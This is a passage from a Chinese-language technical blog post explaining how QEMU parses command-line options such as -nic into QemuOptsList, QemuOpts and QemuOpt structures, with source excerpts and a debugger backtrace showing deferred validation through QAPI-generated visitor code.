          │</span><br><span class="line">│  │ ┌────┬────────┐               │    ┌────┬────────────────┐</span><br><span class="line">│  │ │name│&quot;user&quot;  │               │    │name│&quot;model&quot;         │</span><br><span class="line">│  │ ├────┼────────┤               │    ├────┼────────────────┤</span><br><span class="line">│  │ │str │        │               │    │str │&quot;virtio-net-pci&quot;│</span><br><span class="line">│  │ ├────┼────────┤               │    ├────┼────────────────┤</span><br><span class="line">│  └─┤opts│        │               └────┤opts│                │</span><br><span class="line">│    ├────┼────────┤                    ├────┼────────────────┤</span><br><span class="line">└───►│next│        ├───────────────────►│next│                │</span><br><span class="line">     └────┴────────┘                    └────┴────────────────┘</span><br><span class="line">      struct QemuOpt                     struct QemuOpt</span><br></pre></td></tr></table></figure></p><h3 id="struct-QemuOptsList"><a href="#struct-QemuOptsList" class="headerlink" title="struct QemuOptsList"></a>struct QemuOptsList</h3><p><strong>QEMU</strong>将所有参数分成了几个大选项，如<code>-nic</code>、<code>-cpu</code>等，每一个大选项使用结构体<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qemu/option.h#L64"><strong>struct QemuOptsList</strong></a>表示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOptsList</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *implied_opt_name;</span><br><span class="line">    <span class="type">bool</span> merge_lists;  <span class="comment">/* Merge multiple uses of option into a single list? */</span></span><br><span class="line">    QTAILQ_HEAD(, QemuOpts) head;</span><br><span class="line">    QemuOptDesc desc[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -nic选项的样例</span></span><br><span class="line">QemuOptsList qemu_nic_opts = &#123;</span><br><span class="line">    .name = <span class="string">&quot;nic&quot;</span>,</span><br><span class="line">    .implied_opt_name = <span class="string">&quot;type&quot;</span>,</span><br><span class="line">    .head = QTAILQ_HEAD_INITIALIZER(qemu_nic_opts.head),</span><br><span class="line">    .desc = &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * no elements =&gt; accept any params</span></span><br><span class="line"><span class="comment">         * validation will happen later</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        &#123; <span class="comment">/* end of list */</span> &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="struct-QemuOpt"><a href="#struct-QemuOpt" class="headerlink" title="struct QemuOpt"></a>struct QemuOpt</h3><p>每个<strong>struct QemuOptsList</strong>大选项下还支持多个小选项，如<code>-nic</code>下的<code>user</code>和<code>model</code>等小选项，每个小选项由<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qemu/option_int.h#L32"><strong>struct QemuOpt</strong></a>表示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpt</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *str;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> QemuOptDesc *desc;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">bool</span> boolean;</span><br><span class="line">        <span class="type">uint64_t</span> uint;</span><br><span class="line">    &#125; value;</span><br><span class="line"></span><br><span class="line">    QemuOpts     *opts;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpt) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>其中<strong>name</strong>表示小选项的字符串表示，<strong>str</strong>表示对应的值。需要注意的是，<strong>struct QemuOpt</strong>并不和<strong>struct QemuOptsList</strong>直接联系，这是因为<strong>QEMU</strong>命令行可能会指定创建两个相同参数的设备，因此会使用<strong>struct QemuOpts</strong>连接。</p><h3 id="struct-QemuOpts"><a href="#struct-QemuOpts" class="headerlink" title="struct QemuOpts"></a>struct QemuOpts</h3><p><a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qemu/option_int.h#L46"><strong>struct QemuOpts</strong></a>用于连接<strong>struct QemuOpt</strong>和<strong>struct QemuOptsList</strong>，可以理解为一个大选项的实例<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpts</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    QemuOptsList *<span class="built_in">list</span>;</span><br><span class="line">    Location loc;</span><br><span class="line">    QTAILQ_HEAD(, QemuOpt) head;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpts) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p><strong>QEMU</strong>会在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/vl.c#L2734"><strong>qemu_init()</strong></a>中解析命令行参数，并填充相关的数据结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">qemu_init</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* first pass of option parsing */</span></span><br><span class="line">    optind = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (optind &lt; argc) &#123;</span><br><span class="line">        <span class="keyword">if</span> (argv[optind][<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">/* disk image */</span></span><br><span class="line">            optind++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> QEMUOption *popt;</span><br><span class="line"></span><br><span class="line">            popt = lookup_opt(argc, argv, &amp;optarg, &amp;optind);</span><br><span class="line">            <span class="keyword">switch</span> (popt-&gt;index) &#123;</span><br><span class="line">            <span class="keyword">case</span> QEMU_OPTION_nouserconfig:</span><br><span class="line">                userconfig = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* second pass of option parsing */</span></span><br><span class="line">    optind = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (optind &gt;= argc)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (argv[optind][<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            loc_set_cmdline(argv, optind, <span class="number">1</span>);</span><br><span class="line">            drive_add(IF_DEFAULT, <span class="number">0</span>, argv[optind++], HD_OPTS);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> QEMUOption *popt;</span><br><span class="line"></span><br><span class="line">            popt = lookup_opt(argc, argv, &amp;optarg, &amp;optind);</span><br><span class="line">            <span class="keyword">if</span> (!(popt-&gt;arch_mask &amp; arch_type)) &#123;</span><br><span class="line">                error_report(<span class="string">&quot;Option not supported for this target&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(popt-&gt;index) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">case</span> QEMU_OPTION_nic:</span><br><span class="line">                default_net = <span class="number">0</span>;</span><br><span class="line">                net_client_parse(qemu_find_opts(<span class="string">&quot;nic&quot;</span>), optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>QEMU</strong>首先在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/vl.c#L1618"><strong>lookup_opt()</strong></a>中解析出所属的大选项，然后再继续解析出一个大选项的实例<strong>struct QemuOpts</strong>。</p><p>以<code>-nic</code>大选项为例，其在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/net/net.c#L1920"><strong>net_client_parse()</strong></a>中解析出<strong>struct QemuOpts</strong>并插入在<strong>nic</strong>对应的<strong>struct QemuOptsList</strong>中，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">opts_do_parse</span><span class="params">(QemuOpts *opts, <span class="type">const</span> <span class="type">char</span> *params,</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="type">char</span> *firstname,</span></span><br><span class="line"><span class="params">                          <span class="type">bool</span> warn_on_flag, <span class="type">bool</span> *help_wanted, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *option, *value;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">    QemuOpt *opt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (p = params; *p;) &#123;</span><br><span class="line">        p = get_opt_name_value(p, firstname, warn_on_flag, help_wanted, &amp;option, &amp;value);</span><br><span class="line">        <span class="keyword">if</span> (help_wanted &amp;&amp; *help_wanted) &#123;</span><br><span class="line">            g_free(option);</span><br><span class="line">            g_free(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        firstname = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(option, <span class="string">&quot;id&quot;</span>)) &#123;</span><br><span class="line">            g_free(option);</span><br><span class="line">            g_free(value);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        opt = opt_create(opts, option, value);</span><br><span class="line">        g_free(option);</span><br><span class="line">        <span class="keyword">if</span> (!opt_validate(opt, errp)) &#123;</span><br><span class="line">            qemu_opt_del(opt);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> QemuOpts *<span class="title function_">opts_parse</span><span class="params">(QemuOptsList *<span class="built_in">list</span>, <span class="type">const</span> <span class="type">char</span> *params,</span></span><br><span class="line"><span class="params">                            <span class="type">bool</span> permit_abbrev,</span></span><br><span class="line"><span class="params">                            <span class="type">bool</span> warn_on_flag, <span class="type">bool</span> *help_wanted, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *firstname;</span><br><span class="line">    <span class="type">char</span> *id = opts_parse_id(params);</span><br><span class="line">    QemuOpts *opts;</span><br><span class="line"></span><br><span class="line">    assert(!permit_abbrev || <span class="built_in">list</span>-&gt;implied_opt_name);</span><br><span class="line">    firstname = permit_abbrev ? <span class="built_in">list</span>-&gt;implied_opt_name : <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    opts = qemu_opts_create(<span class="built_in">list</span>, id, !<span class="built_in">list</span>-&gt;merge_lists, errp);</span><br><span class="line">    g_free(id);</span><br><span class="line">    <span class="keyword">if</span> (opts == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!opts_do_parse(opts, params, firstname,</span><br><span class="line">                       warn_on_flag, help_wanted, errp)) &#123;</span><br><span class="line">        qemu_opts_del(opts);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> opts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a QemuOpts in @list and with options parsed from @params.</span></span><br><span class="line"><span class="comment"> * If @permit_abbrev, the first key=value in @params may omit key=,</span></span><br><span class="line"><span class="comment"> * and is treated as if key was @list-&gt;implied_opt_name.</span></span><br><span class="line"><span class="comment"> * Report errors with error_report_err().  This is inappropriate in</span></span><br><span class="line"><span class="comment"> * QMP context.  Do not use this function there!</span></span><br><span class="line"><span class="comment"> * Return the new QemuOpts on success, null pointer on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">QemuOpts *<span class="title function_">qemu_opts_parse_noisily</span><span class="params">(QemuOptsList *<span class="built_in">list</span>, <span class="type">const</span> <span class="type">char</span> *params,</span></span><br><span class="line"><span class="params">                                  <span class="type">bool</span> permit_abbrev)</span></span><br><span class="line">&#123;</span><br><span class="line">    Error *err = <span class="literal">NULL</span>;</span><br><span class="line">    QemuOpts *opts;</span><br><span class="line">    <span class="type">bool</span> help_wanted = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    opts = opts_parse(<span class="built_in">list</span>, params, permit_abbrev, <span class="literal">true</span>,</span><br><span class="line">                      opts_accepts_any(<span class="built_in">list</span>) ? <span class="literal">NULL</span> : &amp;help_wanted,</span><br><span class="line">                      &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (!opts) &#123;</span><br><span class="line">        assert(!!err + !!help_wanted == <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (help_wanted) &#123;</span><br><span class="line">            qemu_opts_print_help(<span class="built_in">list</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_report_err(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> opts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">net_client_parse</span><span class="params">(QemuOptsList *opts_list, <span class="type">const</span> <span class="type">char</span> *optstr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!qemu_opts_parse_noisily(opts_list, optstr, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，<strong>QEMU</strong>在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/qemu-option.c#L881"><strong>opts_parse()</strong></a>中使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/qemu-option.c#L608"><strong>qemu_opts_create()</strong></a>创建<strong>struct QemuOpts</strong>实例并插入到<strong>struct QemuOptsList</strong>中，然后使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/qemu-option.c#L799"><strong>opts_do_parse()</strong></a>解析所有<strong>struct QemuOpt</strong>并插入到<strong>struct QemuOpts</strong>中。</p><p>至于检查参数的正确性，则推迟到初始化<strong>nic</strong>设备时在进行即可，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  visit_check_struct (v=0x5555570ea430, errp=0x5555570ea550) at ../../qemu/qapi/qapi-visit-core.c:62</span></span><br><span class="line"><span class="comment"> * #1  0x0000555556055353 in visit_type_Netdev (v=0x5555570ea430, name=0x0, obj=0x7fffffffda18, errp=0x55555705bca0 &lt;error_fatal&gt;) at qapi/qapi-visit-net.c:1327</span></span><br><span class="line"><span class="comment"> * #2  0x0000555555c3d0b4 in net_client_init (opts=0x5555570e7f60, is_netdev=true, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/net/net.c:1427</span></span><br><span class="line"><span class="comment"> * #3  0x0000555555c3e0f6 in net_param_nic (dummy=0x0, opts=0x5555570e7f60, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/net/net.c:1822</span></span><br><span class="line"><span class="comment"> * #4  0x00005555560b9a7c in qemu_opts_foreach (list=0x555556f485e0 &lt;qemu_nic_opts&gt;, func=0x555555c3dd92 &lt;net_param_nic&gt;, opaque=0x0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment"> * #5  0x0000555555c3e2bb in net_init_clients () at ../../qemu/net/net.c:1860</span></span><br><span class="line"><span class="comment"> * #6  0x0000555555bd8ef8 in qemu_create_late_backends () at ../../qemu/system/vl.c:2011</span></span><br><span class="line"><span class="comment"> * #7  0x0000555555bdd5f7 in qemu_init (argc=15, argv=0x7fffffffde08) at ../../qemu/system/vl.c:3712</span></span><br><span class="line"><span class="comment"> * #8  0x0000555555e9282d in main (argc=15, argv=0x7fffffffde08) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment"> * #9  0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=15, argv=argv@entry=0x7fffffffde08) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment"> * #10 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=15, argv=0x7fffffffde08, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffddf8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment"> * #11 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">visit_type_NetLegacyNicOptions_members</span><span class="params">(Visitor *v, NetLegacyNicOptions *obj, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> has_netdev = !!obj-&gt;netdev;</span><br><span class="line">    <span class="type">bool</span> has_macaddr = !!obj-&gt;macaddr;</span><br><span class="line">    <span class="type">bool</span> has_model = !!obj-&gt;model;</span><br><span class="line">    <span class="type">bool</span> has_addr = !!obj-&gt;addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (visit_optional(v, <span class="string">&quot;netdev&quot;</span>, &amp;has_netdev)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visit_type_str(v, <span class="string">&quot;netdev&quot;</span>, &amp;obj-&gt;netdev, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (visit_optional(v, <span class="string">&quot;macaddr&quot;</span>, &amp;has_macaddr)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visit_type_str(v, <span class="string">&quot;macaddr&quot;</span>, &amp;obj-&gt;macaddr, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (visit_optional(v, <span class="string">&quot;model&quot;</span>, &amp;has_model)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visit_type_str(v, <span class="string">&quot;model&quot;</span>, &amp;obj-&gt;model, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (visit_optional(v, <span class="string">&quot;addr&quot;</span>, &amp;has_addr)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visit_type_str(v, <span class="string">&quot;addr&quot;</span>, &amp;obj-&gt;addr, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (visit_optional(v, <span class="string">&quot;vectors&quot;</span>, &amp;obj-&gt;has_vectors)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visit_type_uint32(v, <span class="string">&quot;vectors&quot;</span>, &amp;obj-&gt;vectors, errp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">visit_type_Netdev_members</span><span class="params">(Visitor *v, Netdev *obj, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> (obj-&gt;type) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> NET_CLIENT_DRIVER_NIC:</span><br><span class="line">        <span class="keyword">return</span> visit_type_NetLegacyNicOptions_members(v, &amp;obj-&gt;u.nic, errp);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">visit_type_Netdev</span><span class="params">(Visitor *v, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">                 Netdev **obj, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> ok = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!visit_start_struct(v, name, (<span class="type">void</span> **)obj, <span class="keyword">sizeof</span>(Netdev), errp)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!*obj) &#123;</span><br><span class="line">        <span class="comment">/* incomplete */</span></span><br><span class="line">        assert(visit_is_dealloc(v));</span><br><span class="line">        ok = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">goto</span> out_obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!visit_type_Netdev_members(v, *obj, errp)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out_obj;</span><br><span class="line">    &#125;</span><br><span class="line">    ok = visit_check_struct(v, errp);</span><br><span class="line">out_obj:</span><br><span class="line">    visit_end_struct(v, (<span class="type">void</span> **)obj);</span><br><span class="line">    <span class="keyword">if</span> (!ok &amp;&amp; visit_is_input(v)) &#123;</span><br><span class="line">        qapi_free_Netdev(*obj);</span><br><span class="line">        *obj = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>QEMU</strong>在<strong>visit_type_Netdev()</strong>完成参数的认证，其通过<strong>visit_type_Netdev_members()</strong>解析<strong>nic</strong>大选项预设的小选项，并将<strong>struct QemuOpts</strong>中剩余的小选项当做非法小选项即可。其中<strong>visit_type_Netdev()</strong>函数是通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/scripts/qapi-gen.py"><strong>qapi-gen.py</strong></a>基于<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qapi/net.json#L97"><strong>net.json</strong></a>自动生成的函数。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://qemu-project.gitlab.io/qemu/devel/qom.html">The QEMU Object Model (QOM)</a></li><li><a 